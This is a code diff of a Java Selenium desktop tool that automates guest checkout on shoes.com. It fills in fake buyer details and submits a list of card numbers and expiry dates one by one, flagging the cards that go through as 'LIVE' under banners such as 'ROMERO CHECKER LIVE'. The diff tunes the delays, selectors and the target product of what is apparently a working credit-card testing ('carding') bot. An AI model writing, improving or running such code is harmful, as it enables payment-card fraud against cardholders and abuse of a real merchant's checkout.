@@ -87,6 +87,7 @@ public class formFichero extends javax.swing.JFrame {
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
         setBackground(new java.awt.Color(102, 102, 102));
+        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
 
         jPanel1.setBackground(new java.awt.Color(51, 51, 51));
 
@@ -247,7 +248,7 @@ public class formFichero extends javax.swing.JFrame {
                         totalContTarjetas++;
                         jLabelNumeroTarjetas.setText("Total tarjetas evaluadas: " + totalContTarjetas);
 
-                        Thread.sleep(3000);
+                        //Thread.sleep(3000);
                         WebElement number = driver.findElement(By.name("number"));
                         number.sendKeys(numeroBean);
                         WebElement mes = driver.findElement(By.name("expMonth"));
@@ -256,13 +257,13 @@ public class formFichero extends javax.swing.JFrame {
                         WebElement anio = driver.findElement(By.name("expYear"));
                         Select selectAnio = new Select(anio);
                         selectAnio.selectByValue(numeroAnio);
-                        Thread.sleep(3000);
+                        Thread.sleep(1000);
                         number.sendKeys(Keys.ENTER);
                         Thread.sleep(3000);
                         //WebElement buttonCompra = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary chk-proceed-btn right'][text()='Place Order'][text()='Place Order']/self::BUTTON"));
                         WebElement buttonCompra = (new WebDriverWait(driver, 20).until(ExpectedConditions.visibilityOfElementLocated(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary chk-proceed-btn right'][text()='Place Order'][text()='Place Order']/self::BUTTON"))));
                         buttonCompra.click();
-                        Thread.sleep(3000);
+                        Thread.sleep(4000);
                         /*
                             Validamos que el elemento este visible y se haya cargado
                         */
@@ -276,7 +277,7 @@ public class formFichero extends javax.swing.JFrame {
                             Si el modal esta, cerrar y ejecutar los siguientes pasos para volver al bucle de las tarjetas
                          */
                         if (valor) {
-                            Thread.sleep(2000);
+                            Thread.sleep(3000);
                             WebElement modalClose = driver.findElement(By.className("close"));
                             modalClose.click();
                             Thread.sleep(2000);
@@ -299,7 +300,7 @@ public class formFichero extends javax.swing.JFrame {
                             if (contTarjeta > 9) {
                                 driver.navigate().refresh();
                                 System.out.println("----------Refrezcando navegador----------");
-                                Thread.sleep(4000);
+                                Thread.sleep(3000);
                                 contTarjeta = 0;
                             }
 
@@ -308,13 +309,13 @@ public class formFichero extends javax.swing.JFrame {
                             File a = new File("sonido.wav");
                             sonido.open(AudioSystem.getAudioInputStream(a));
                             sonido.start();
-                            Thread.sleep(2000);
+                            Thread.sleep(1000);
                             sonido.start();
                             JTextArea ta = new JTextArea(5, 5);
                             ta.setText(numeroBean);
-                            JOptionPane.showMessageDialog(null, ta, "Tarjeta", JOptionPane.INFORMATION_MESSAGE);
-                            System.out.println("Tarjeta es " + numeroBean);
-                            mostrarTabla(numeroBean);
+                            JOptionPane.showMessageDialog(null, ta, "LIVE", JOptionPane.INFORMATION_MESSAGE);
+                            System.out.println(" ☜(ˆ▿ˆc) ROMERO CHECKER LIVE " + numeroBean +  numeroMes + numeroAnio );
+                            mostrarTabla("😎 Rise2UPChckr" + numeroBean + numeroMes + numeroAnio + " LIVE 😎");
                             driver.manage().deleteAllCookies();
                             Thread.sleep(4000);
                             /*
@@ -348,7 +349,8 @@ public class formFichero extends javax.swing.JFrame {
      */
     private static void runAuto(WebDriver driver) {
         try {
-            driver.get("https://www.shoes.com/johnston-murphy-performance-loafer/614421/1262220");
+            driver.get("https://www.shoes.com/johnston-murphy-cotton-ribbed-otc/614418/1262212");
+            //driver.get("https://www.shoes.com");
             /*
                     Botón agregar compra
              */
@@ -358,39 +360,40 @@ public class formFichero extends javax.swing.JFrame {
             /*
                     Botón checkout
              */
-            Thread.sleep(2000);
-            WebElement buttonCheckout = driver.findElement(By.className("crt-proceed-btn"));
-            Thread.sleep(2000);
+            Thread.sleep(3000);
+            //WebElement buttonCheckout = driver.findElement(By.className("crt-proceed-btn"));
+            WebElement buttonCheckout = driver.findElement(By.xpath("//BUTTON[@class='sb-button-1 sb-button-1--primary crt-proceed-btn'][text()='Checkout'][text()='Checkout']/self::BUTTON"));
+
+            Thread.sleep(3000);
             buttonCheckout.click();
             /*
                     Formulario de email
              */
-            Thread.sleep(3000);
+            Thread.sleep(4000);
             WebElement email = driver.findElement(By.name("guestEmail"));
             Random aleatorio = new Random();
             int intAletorio = aleatorio.nextInt(10000);
-            email.sendKeys("Anonimo" + intAletorio + "@gmail.com");
+            email.sendKeys("jamesdation" + intAletorio + "@gmail.com");
             Thread.sleep(3000);
             email.sendKeys(Keys.ENTER);
             /*
                     Formulario de registro de datos
              */
-            Thread.sleep(3000);
+            Thread.sleep(2000);
             WebElement firsName = driver.findElement(By.name("firstName"));
-            firsName.sendKeys("Pepito");
+            firsName.sendKeys("Mister");
 
             WebElement lastName = driver.findElement(By.name("lastName"));
-            lastName.sendKeys("Perez");
-            /*
-                Se agregan las direcciones
-            */
-            String[] direcciones = {"Transilvania 45", "Manzana 2, casa 4", "Otra direccion", "Super manzana 1", "Super dos", "Avenida siempre viva 12222", "Otra direccion rara", "Carrera 123 avenida 2", "Carrera 344 casa1", "avenida 234 carrera 4"};
-            int direccion = aleatorio.nextInt(10);
+            lastName.sendKeys("Donation");
+            //String[] direcciones = {"ninguna", "ninguna", "ninguna", "ninguna", "ninguna"};
+            //int direccion = aleatorio.nextInt(10);
             WebElement address1 = driver.findElement(By.name("address1"));
-            address1.sendKeys(direcciones[direccion]);
+            address1.sendKeys("ninguna");
+            //address1.sendKeys(direcciones[direccion]);
 
             WebElement address2 = driver.findElement(By.name("address2"));
-            address2.sendKeys(direcciones[direccion]);
+            address2.sendKeys("ninguna");
+            //address2.sendKeys(direcciones[direccion]);
 
             WebElement city = driver.findElement(By.name("city"));
             city.sendKeys("San diego");
@@ -404,7 +407,7 @@ public class formFichero extends javax.swing.JFrame {
 
             WebElement phoneNumber = driver.findElement(By.name("phoneNumber"));
             
-            phoneNumber.sendKeys("12341"+direccion+"9381");
+            phoneNumber.sendKeys("93180"+ intAletorio +"9381");
 
             phoneNumber.sendKeys(Keys.ENTER);
             Thread.sleep(3000);
@@ -426,8 +429,10 @@ public class formFichero extends javax.swing.JFrame {
     }//GEN-LAST:event_jTableTarjetaKeyPressed
 
     private void btnRun1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnRun1ActionPerformed
-        // TODO add your handling code here:
-        Runtime.getRuntime().exit(0);
+    System.exit(0);    
+// TODO add your handling code here:
+
+        Runtime.getRuntime().exit(0);  //esto cierra la aplicacion
     }//GEN-LAST:event_btnRun1ActionPerformed
 
     /**
